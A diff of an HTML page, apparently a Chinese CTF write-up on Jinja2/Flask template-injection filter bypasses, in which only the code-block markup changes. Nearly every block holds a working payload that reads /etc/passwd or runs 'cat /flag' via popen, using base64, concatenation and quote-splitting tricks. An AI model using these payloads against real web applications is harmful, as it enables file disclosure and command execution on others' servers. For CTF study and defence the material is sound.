@@ -1405,8 +1405,8 @@
 <li>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></li>
 </ul>
 <p><code>['']</code> 绕过<code>.</code></p>
-<pre tabindex="0"><code>{{&#34;&#34;.__class__}}  =  {{&#34;&#34;[&#39;__class&#39;]}}
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{&#34;&#34;.__class__}}  =  {{&#34;&#34;[&#39;__class&#39;]}}
+</span></span></code></pre></div>
 
 <h3 class="relative group"><code>[]</code> 过滤 
     <div id="-%E8%BF%87%E6%BB%A4-2" class="anchor"></div>
@@ -1419,8 +1419,8 @@
     
 </h3>
 <p>pop 函数</p>
-<pre tabindex="0"><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()
+</span></span></code></pre></div>
 
 <h3 class="relative group"><code>&quot;</code> 过滤 
     <div id="-%E8%BF%87%E6%BB%A4-3" class="anchor"></div>
@@ -1433,13 +1433,13 @@
     
 </h3>
 <p><code>request.args</code> 是flask中的一个属性，用 GET path 参数传递路径</p>
-<pre tabindex="0"><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd
-</code></pre><p><code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
-<pre tabindex="0"><code>GET:  
-{{ &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;/etc/passwd&#39;).read() }}  
-POST:  
-class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd
+</span></span></code></pre></div><p><code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET:  
+</span></span><span style="display:flex;"><span>{{ &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;/etc/passwd&#39;).read() }}  
+</span></span><span style="display:flex;"><span>POST:  
+</span></span><span style="display:flex;"><span>class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+</span></span></code></pre></div>
 
 <h3 class="relative group">关键字过滤 
     <div id="%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4" class="anchor"></div>
@@ -1452,10 +1452,10 @@ class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
     
 </h3>
 <p><code>__getattribute__</code> base64 编码</p>
-<pre tabindex="0"><code>{{[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
-</code></pre><p>字符串拼接</p>
-<pre tabindex="0"><code>{{[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
-</code></pre><p>关键字中插入一对单引号 <code>''</code>，绕过对关键字的黑名单过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
+</span></span></code></pre></div><p>字符串拼接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&#34;/etc/passwd&#34;).read()}}
+</span></span></code></pre></div><p>关键字中插入一对单引号 <code>''</code>，绕过对关键字的黑名单过滤</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Go" data-lang="Go"><span style="display:flex;"><span>BaseCTF{<span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">print</span>(&#39;<span style="color:#f1fa8c">&#39;[&#39;</span>_&#39;&#39;_cl&#39;&#39;ass_&#39;<span style="color:#f1fa8c">&#39;_&#39;</span>][<span style="color:#f1fa8c">&#39;_&#39;</span>&#39;_ba&#39;&#39;se_&#39;<span style="color:#f1fa8c">&#39;_&#39;</span>][<span style="color:#f1fa8c">&#39;_&#39;</span>&#39;_subcla&#39;&#39;sses_&#39;<span style="color:#f1fa8c">&#39;_&#39;</span>]()[<span style="color:#bd93f9">137</span>])<span style="color:#ff79c6">%</span>}
 </span></span></code></pre></div>
 
@@ -1473,12 +1473,12 @@ class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
 <ul>
 <li>chr(47) 表示 <code>/</code></li>
 </ul>
-<pre tabindex="0"><code>{% set chr= &#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;_&#39;&#39;_bui&#39;&#39;ltins_&#39;&#39;_&#39;][&#39;chr&#39;]%}
-
-{% set cmd=&#39;cat &#39;~chr(47)~&#39;flag&#39; %}
-
-{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](cmd)[&#39;rea&#39;&#39;d&#39;]())%}
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{% set chr= &#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;_&#39;&#39;_bui&#39;&#39;ltins_&#39;&#39;_&#39;][&#39;chr&#39;]%}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{% set cmd=&#39;cat &#39;~chr(47)~&#39;flag&#39; %}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](cmd)[&#39;rea&#39;&#39;d&#39;]())%}
+</span></span></code></pre></div><hr>
 
 
 <h2 class="relative group">参考 
